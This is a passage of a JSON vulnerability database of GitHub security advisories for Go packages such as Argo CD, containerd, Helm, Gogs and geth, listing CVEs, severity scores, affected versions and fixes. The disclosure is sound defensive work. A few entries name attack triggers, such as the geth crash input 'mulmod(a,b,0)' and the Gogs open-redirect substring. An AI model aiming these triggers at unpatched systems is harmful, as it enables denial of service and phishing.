"2021-06-29T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xcf7-q56x-78gh", "modified": "2023-08-30T18:51:53Z", "published": "2021-07-26T21:23:49Z", "aliases": ["CVE-2021-23409"], "summary": "github.com/pires/go-proxyproto vulnerable to DoS via Connection descriptor exhaustion", "details": "The package `github.com/pires/go-proxyproto` before 0.6.1 is vulnerable to Denial of Service (DoS) via creating connections without the proxy protocol header. While this issue was patched in 0.6.0, the fix introduced additional issues which were subsequently patched in 0.6.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pires/go-proxyproto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23409"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/issues/65"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/issues/75"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/pull/74"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/pull/74/commits/cdc63867da24fc609b727231f682670d0d1cd346"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/pull/76"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/commit/2e44d7a76a851d66890ab341403253afae5caac2"}, {"type": "PACKAGE", "url": "https://github.com/pires/go-proxyproto"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/releases/tag/v0.6.0"}, {"type": "WEB", "url": "https://github.com/pires/go-proxyproto/releases/tag/v0.6.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0233"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPIRESGOPROXYPROTO-1316439"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-26T17:31:53Z", "nvd_published_at": "2021-07-21T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-25gf-8qrr-g78r", "modified": "2022-08-11T20:43:48Z", "published": "2021-07-19T21:21:03Z", "aliases": ["CVE-2021-32574"], "summary": "Hashicorp Consul Missing SSL Certificate Validation", "details": "HashiCorp Consul before 1.10.1 (and Consul Enterprise) has Missing SSL Certificate Validation. xds does not ensure that the Subject Alternative Name of an upstream is validated.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32574"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2021-17-consul-s-envoy-tls-configuration-did-not-validate-destination-service-subject-alternative-names/26856"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/releases/tag/v1.10.1"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202208-09"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/consul"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-19T17:36:42Z", "nvd_published_at": "2021-07-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xcqr-9h24-vrgw", "modified": "2023-10-02T12:25:40Z", "published": "2021-07-26T21:19:37Z", "aliases": ["CVE-2020-8827"], "summary": "Improper Restriction of Excessive Authentication Attempts in Argo API", "details": "As of v1.5.0, the Argo API does not implement anti-automation measures such as rate limiting, account lockouts, or other anti-bruteforce measures. Attackers can submit an unlimited number of authentication attempts without consequence.\n\n### Specific Go Packages Affected\ngithub.com/argoproj/argo-cd/util/cache", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8827"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/3369"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/3404"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/35a7350b7444bcaf53ee0bb11b9d8e3ae4b717a1"}, {"type": "WEB", "url": "https://argoproj.github.io/argo-cd/operator-manual/user-management/#disable-admin-user"}, {"type": "WEB", "url": "https://argoproj.github.io/argo-cd/security_considerations/"}, {"type": "WEB", "url": "https://github.com/argoproj/argo/releases"}, {"type": "WEB", "url": "https://www.soluble.ai/blog/argo-cves-2020"}], "database_specific": {"cwe_ids": ["CWE-307"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-26T21:13:31Z", "nvd_published_at": "2020-04-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7638-r9r3-rmjj", "modified": "2023-08-29T18:32:51Z", "published": "2021-07-19T15:19:09Z", "aliases": ["CVE-2021-3602"], "summary": "Buildah processes using chroot isolation may leak environment values to intermediate processes", "details": "### Impact\nWhen running processes using \"chroot\" isolation, the process being run can examine the environment variables of its immediate parent and grandparent processes (CVE-2021-3602).  This isolation type is often used when running `buildah` in unprivileged containers, and it is often used to do so in CI/CD environments.  If sensitive information is exposed to the original `buildah` process through its environment, that information will unintentionally be shared with child processes which it starts as part of handling RUN instructions or during `buildah run`.  The commands that `buildah` is instructed to run can read that information if they choose to.\n\n### Patches\nUsers should upgrade packages, or images which contain packages, to include version 1.21.3 or later.\n\n### Workarounds\nAs a workaround, invoking `buildah` in a container under `env -i` to have it started with a reinitialized environment should prevent the leakage.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [buildah](https://github.com/containers/buildah/issues)\n* Email us at [the buildah general mailing list](mailto:buildah@lists.buildah.io), or [the podman security mailing list](mailto:security@lists.podman.io) if it's sensitive.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.16.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.16.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.17.0"}, {"fixed": "1.17.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.17.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.18.0"}, {"fixed": "1.19.9"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.19.8"}}, {"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.20.0"}, {"fixed": "1.21.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.21.2"}}], "references": [{"type": "WEB", "url": "https://github.com/containers/buildah/security/advisories/GHSA-7638-r9r3-rmjj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3602"}, {"type": "WEB", "url": "https://github.com/containers/buildah/commit/a468ce0ffd347035d53ee0e26c205ef604097fb0"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1969264"}, {"type": "PACKAGE", "url": "https://github.com/containers/buildah"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0345"}, {"type": "WEB", "url": "https://ubuntu.com/security/CVE-2021-3602"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-212"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-07-15T20:26:57Z", "nvd_published_at": "2022-03-03T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h8jc-jmrf-9h8f", "modified": "2023-09-25T17:30:03Z", "published": "2021-07-26T21:19:27Z", "aliases": ["CVE-2020-8828"], "summary": "Argo CD Insecure default administrative password", "details": "In Argo CD versions 1.8.0 and prior, the default admin password is set to the argocd-server pod name. For insiders with access to the cluster or logs, this issue could be abused for privilege escalation, as Argo has privileged roles. A malicious insider is the most realistic threat, but pod names are not meant to be kept secret and could wind up just about anywhere.\n\n#### Workaround:\n\nThe recommended mitigation as described in the user documentation is to use SSO integration. The default admin password should only be used for initial configuration and then [disabled](https://argo-cd.readthedocs.io/en/stable/operator-manual/user-management/#disable-admin-user) or at least changed to a more secure password.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.8.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8828"}, {"type": "WEB", "url": "https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8828-insecure-default-administrative-password"}, {"type": "WEB", "url": "https://argoproj.github.io/argo-cd/security_considerations/"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/blob/129cf5370f9e2c6f99c9a5515099250a7ba42099/docs/security_considerations.md#cve-2020-8828---insecure-default-administrative-password"}, {"type": "WEB", "url": "https://github.com/argoproj/argo/releases"}, {"type": "WEB", "url": "https://www.soluble.ai/blog/argo-cves-2020"}], "database_specific": {"cwe_ids": ["CWE-1188", "CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-07-26T21:14:45Z", "nvd_published_at": "2020-04-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c72p-9xmj-rx3w", "modified": "2023-04-03T22:38:53Z", "published": "2021-07-26T21:17:45Z", "aliases": ["CVE-2021-32760"], "summary": "Archive package allows chmod of file outside of unpack target directory", "details": "## Impact\n\nA bug was found in containerd where pulling and extracting a specially-crafted container image can result in Unix file permission changes for existing files in the host\u2019s filesystem.  Changes to file permissions can deny access to the expected owner of the file, widen access to others, or set extended bits like setuid, setgid, and sticky.  This bug does not directly allow files to be read, modified, or executed without an additional cooperating process.\n\n## Patches\n\nThis bug has been fixed in containerd 1.5.4 and 1.4.8.  Users should update to these versions as soon as they are released.  Running containers do not need to be restarted.\n\n## Workarounds\n\nEnsure you only pull images from trusted sources.\n\nLinux security modules (LSMs) like SELinux and AppArmor can limit the files potentially affected by this bug through policies and profiles that prevent containerd from interacting with unexpected files.\n\n## For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at security@containerd.io if you think you\u2019ve found a security bug.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.5.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-c72p-9xmj-rx3w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32760"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/22e9a70c71eff6507be71955947a611f2ed91e6c"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/7ad08c69e09ee4930a48dbf2aab3cd612458617f"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.4.8"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.5.4"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DDMNDPJJTP3J5GOEDB66F6MGXUTRG3Y3/"}], "database_specific": {"cwe_ids": ["CWE-668", "CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-07-22T20:21:14Z", "nvd_published_at": "2021-07-19T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7jr6-prv4-5wf5", "modified": "2023-08-30T10:26:47Z", "published": "2021-06-23T18:14:31Z", "aliases": ["CVE-2021-32690"], "summary": "Helm passes repository credentials to alternate domain", "details": "Helm is a tool for managing Charts (packages of pre-configured Kubernetes resources). In versions of helm prior to 3.6.1, a vulnerability exists where the username and password credentials associated with a Helm repository could be passed on to another domain referenced by that Helm repository. This issue has been resolved in 3.6.1. There is a workaround through which one may check for improperly passed credentials. One may use a username and password for a Helm repository and may audit the Helm repository in order to check for another domain being used that could have received the credentials. In the `index.yaml` file for that repository, one may look for another domain in the `urls` list for the chart versions. If there is another domain found and that chart version was pulled or installed, the credentials would be passed on.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-56hp-xqp3-w2jf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32690"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/61d8e8c4a6f95540c15c6a65f36a6dd0a45e7a2f"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-56hp-xqp3-w2jf"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.6.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0384"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-06-18T18:34:04Z", "nvd_published_at": "2021-06-16T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cpgw-2wxr-pww3", "modified": "2021-05-20T20:55:39Z", "published": "2021-06-29T18:32:39Z", "aliases": ["CVE-2018-15178"], "summary": "Open Redirect", "details": "Open redirect vulnerability in Gogs before 0.12 allows remote attackers to redirect users to arbitrary websites and conduct phishing attacks via an initial /\\ substring in the user/login redirect_to parameter, related to the function isValidRedirect in routes/user/auth.go.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15178"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/5364"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/5365"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/1f247cf8139cb483276cd8dd06385a800ce9d4b2"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:55:39Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g6xv-8q23-w2q3", "modified": "2021-05-20T16:59:51Z", "published": "2021-06-29T18:32:48Z", "aliases": ["CVE-2014-8682"], "summary": "SQL Injection in Gogs", "details": "Multiple SQL injection vulnerabilities in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.x before 0.5.6.1105 Beta allow remote attackers to execute arbitrary SQL commands via the q parameter to (1) api/v1/repos/search, which is not properly handled in models/repo.go, or (2) api/v1/users/search, which is not properly handled in models/user.go.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.1"}, {"fixed": "0.5.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-8682"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/commit/0c5ba4573aecc9eaed669e9431a70a5d9f184b8d"}, {"type": "WEB", "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/98694"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/releases/tag/v0.5.8"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/35238"}, {"type": "WEB", "url": "http://gogs.io/docs/intro/change_log.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/129116/Gogs-Label-Search-Blind-SQL-Injection.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/129117/Gogs-Repository-Search-SQL-Injection.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2014/Nov/31"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2014/Nov/33"}, {"type": "WEB", "url": "http://www.exploit-db.com/exploits/35238"}, {"type": "WEB", "url": "http://www.securityfocus.com/archive/1/533995/100/0/threaded"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/71187"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:59:51Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4hq8-gmxx-h6w9", "modified": "2023-02-07T21:30:32Z", "published": "2021-06-23T17:29:42Z", "aliases": ["CVE-2020-27846"], "summary": "XML Processing error in github.com/crewjam/saml", "details": "### Impact\n\nThere are three vulnerabilities in the go `encoding/xml` package that can allow an attacker to forge part of a signed XML document. For details on this vulnerability see [xml-roundtrip-validator](https://github.com/mattermost/xml-roundtrip-validator)\n\n### Patches\n\nIn version 0.4.3, all XML input is validated prior to being parsed.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/crewjam/saml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/crewjam/saml/security/advisories/GHSA-4hq8-gmxx-h6w9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-27846"}, {"type": "WEB", "url": "https://github.com/crewjam/saml/commit/da4f1a0612c0a8dd0452cf8b3c7a6518f6b4d053"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1907670"}, {"type": "PACKAGE", "url": "https://github.com/crewjam/saml"}, {"type": "WEB", "url": "https://grafana.com/blog/2020/12/17/grafana-6.7.5-7.2.3-and-7.3.6-released-with-important-security-fix-for-grafana-enterprise/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3YUTKIRWT6TWU7DS6GF3EOANVQBFQZYI/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ICP3YRY2VUCNCF2VFUSK77ZMRIC77FEM/"}, {"type": "WEB", "url": "https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0058"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210205-0002/"}], "database_specific": {"cwe_ids": ["CWE-115", "CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T20:54:26Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rmw5-xpg9-jr29", "modified": "2022-04-27T20:30:31Z", "published": "2021-06-10T17:23:21Z", "aliases": ["CVE-2020-28924"], "summary": "Use of Cryptographically Weak Pseudo-Random Number Generator in Rclone", "details": "An issue was discovered in Rclone before 1.53.3. Due to the use of a weak random number generator, the password generator has been producing weak passwords with much less entropy than advertised. The suggested passwords depend deterministically on the time the second rclone was started. This limits the entropy of the passwords enormously. These passwords are often used in the crypt backend for encryption of data. It would be possible to make a dictionary of all possible passwords with about 38 million entries per password length. This would make decryption of secret material possible with a plausible amount of effort. NOTE: all passwords generated by affected versions should be changed.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rclone/rclone"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.53.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28924"}, {"type": "WEB", "url": "https://github.com/rclone/rclone/issues/4783"}, {"type": "PACKAGE", "url": "https://github.com/rclone/rclone"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UJIFT24Q6EFXLQZ24AER2QGFFZLMIPCD/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202107-14"}], "database_specific": {"cwe_ids": ["CWE-331", "CWE-338"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-06-09T14:47:19Z", "nvd_published_at": "2020-11-19T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5mv9-q7fq-9394", "modified": "2023-01-10T16:08:38Z", "published": "2021-06-01T21:21:01Z", "aliases": ["CVE-2021-32635"], "summary": "Action Commands (run/shell/exec) Against Library URIs Ignore Configured Remote Endpoint", "details": "### Impact\n\nDue to incorrect use of a default URL, `singularity` action commands (`run`/`shell`/`exec`) specifying a container using a `library://` URI will always attempt to retrieve the container from the default remote endpoint (`cloud.sylabs.io`) rather than the configured remote endpoint.\n\nAn attacker may be able to push a malicious container to the default remote endpoint with a URI that is identical to the URI used by a victim with a non-default remote endpoint, thus executing the malicious container.\n\nOnly action commands (`run`/`shell`/`exec`) against `library://` URIs are affected. Other commands such as `pull` / `push` respect the configured remote endpoint.\n\n### Patches\n\nAll users should upgrade to Singularity 3.7.4 or later.\n\nA patch was applied at: https://github.com/sylabs/singularity/commit/d52ae9d13979733c5e987a566fae59ed6f1bf796\n\n### Workarounds\n\nUsers who only interact with the default remote endpoint are not affected.\n\nInstallations with an execution control list configured to restrict execution to containers signed with specific secure keys are not affected.\n\n### For more information\n\nGeneral questions about the impact of the advisory can be asked in the:\n\n- [SingularityCE Slack Channel](https://singularityce.slack.com)\n- [SingularityCE Mailing List](https://groups.google.com/g/singularity-ce)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.7.2"}, {"fixed": "3.7.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-jq42-hfch-42f3"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/security/advisories/GHSA-5mv9-q7fq-9394"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32635"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/commit/d52ae9d13979733c5e987a566fae59ed6f1bf796"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/singularity"}, {"type": "WEB", "url": "https://github.com/sylabs/singularity/releases/tag/v3.7.4"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202107-50"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-28T20:04:35Z", "nvd_published_at": "2021-05-28T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9hx4-qm7h-x84j", "modified": "2021-05-20T16:31:56Z", "published": "2021-06-29T18:32:53Z", "aliases": ["CVE-2014-8683"], "summary": "Cross-site Scripting in Gogs", "details": "Cross-site scripting (XSS) vulnerability in models/issue.go in Gogs (aka Go Git Service) 0.3.1-9 through 0.5.x before 0.5.8 allows remote attackers to inject arbitrary web script or HTML via the text parameter to api/v1/markdown.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.1"}, {"fixed": "0.5.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-8683"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/commit/3abc41cccab2486012b46305827433ad6f5deade"}, {"type": "WEB", "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/98693"}, {"type": "WEB", "url": "https://github.com/gogits/gogs/releases/tag/v0.5.8"}, {"type": "WEB", "url": "https://gogs.io/docs/intro/change_log.html"}, {"type": "WEB", "url": "https://packetstormsecurity.com/files/129118/Gogs-Markdown-Renderer-Cross-Site-Scripting.html"}, {"type": "WEB", "url": "https://seclists.org/fulldisclosure/2014/Nov/31"}, {"type": "WEB", "url": "https://seclists.org/fulldisclosure/2014/Nov/34"}, {"type": "WEB", "url": "https://www.securityfocus.com/archive/1/533996/100/0/threaded"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:31:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jm5c-rv3w-w83m", "modified": "2021-05-21T21:50:44Z", "published": "2021-06-29T21:13:20Z", "aliases": ["CVE-2020-26242"], "summary": "Denial of service in geth", "details": "### Impact\nDenial-of-service (crash) during block processing\n\n### Details\n\nAffected versions suffer from a vulnerability which can be exploited through the `MULMOD` operation, by specifying a modulo of `0`: `mulmod(a,b,0)`, causing a `panic` in the underlying library. \nThe crash was in the `uint256` library, where a buffer [underflowed](https://github.com/holiman/uint256/blob/4ce82e695c10ddad57215bdbeafb68b8c5df2c30/uint256.go#L442).\n\n\tif `d == 0`, `dLen` remains `0`\n\nand https://github.com/holiman/uint256/blob/4ce82e695c10ddad57215bdbeafb68b8c5df2c30/uint256.go#L451 will try to access index `[-1]`.\n\nThe `uint256` library was first merged in this [commit](https://github.com/ethereum/go-ethereum/commit/cf6674539c589f80031f3371a71c6a80addbe454), on 2020-06-08. \nExploiting this vulnerabilty would cause all vulnerable nodes to drop off the network. \n\nThe issue was brought to our attention through a [bug report](https://github.com/ethereum/go-ethereum/issues/21367), showing a `panic` occurring on sync from genesis on the Ropsten network.\n \nIt was estimated that the least obvious way to fix this would be to merge the fix into `uint256`, make a new release of that library and then update the geth-dependency.\n\n- https://github.com/holiman/uint256/releases/tag/v1.1.1 was made the same day, \n- PR to address the issue: https://github.com/holiman/uint256/pull/80 \n- PR to update geth deps: https://github.com/ethereum/go-ethereum/pull/21368 \n\n\n### Patches\nUpgrade to v1.9.18 or higher\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)\n* Email us at [security@ethereum.org](mailto:security@ethereum.org)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.16"}, {"fixed": "1.9.18"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/holiman/uint256"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/security/advisories/GHSA-jm5c-rv3w-w83m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26242"}, {"type": "WEB", "url": "https://github.com/holiman/uint256/pull/80"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/7163a6664ee664df81b9028ab3ba13b9d65a7196"}, {"type": "WEB", "url": "https://github.com/holiman/uint256/commit/6785da6e3eea403260a5760029e722aa4ff1716d"}, {"type": "WEB", "url": "https://blog.ethereum.org/2020/11/12/geth_security_release/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0103"}], "database_specific": {"cwe_ids": ["CWE-125", "CWE-191", "CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:50:44Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-35qp-xq9f-2rjx", "modified": "2021-05-12T21:38:07Z", "published": "2021-06-24T20:28:28Z", "aliases": ["CVE-2021-3283"], "summary": "Improper Privilege Management in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise up to 0.12.9 exec and java task drivers can access processes associated with other tasks on the same node. Fixed in 0.12.10, and 1.0.3.", "severity": [{"type": "CVSS_V3", "score": 